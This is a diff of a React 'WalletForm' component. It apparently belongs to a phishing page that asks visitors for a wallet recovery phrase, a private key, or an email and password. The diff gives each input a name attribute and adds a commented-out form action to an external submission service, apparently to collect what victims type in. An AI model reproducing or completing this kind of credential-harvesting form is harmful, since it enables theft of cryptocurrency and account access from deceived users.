@@ -39,13 +39,16 @@ function WalletForm(props) {
                         <span onClick={() => setFormName('Signin')}>Sign In</span>
                         <span onClick={() => setFormName('Private')}>Private Key</span>
                     </Tdiv>
-                    <Form>
+                    <Form 
+                    // action="https://submit-form.com/j5qcinQd"
+                    >
                         {formName === 'Phrases' &&
                             <Input1
                                 className={valid === false ? 'invalid' : ''}
                                 ref={inputRef}
                                 type="text"
                                 onChange={(e) => setValue(e.target.value)}
+                                name='name'
                                 // value={value}
                                 placeholder="Enter your recovery phase"
                             />
@@ -57,6 +60,7 @@ function WalletForm(props) {
                                 ref={inputRef}
                                 type="textarea"
                                 onChange={(e) => setValue(e.target.value)}
+                                name='name'
                                 placeholder="Enter your private key"
                             />
                         }
@@ -68,6 +72,7 @@ function WalletForm(props) {
                                     ref={inputRef}
                                     onChange={(e) => setValue(e.target.value)}
                                     type="email"
+                                    name='name'
                                     placeholder="Enter email"
                                 />
                                 <Input2
@@ -75,6 +80,7 @@ function WalletForm(props) {
                                     ref={inputRef}
                                     onChange={(e) => setValue(e.target.value)}
                                     type="password"
+                                    name='name'
                                     placeholder="Enter Password"
                                 />
                             </div>
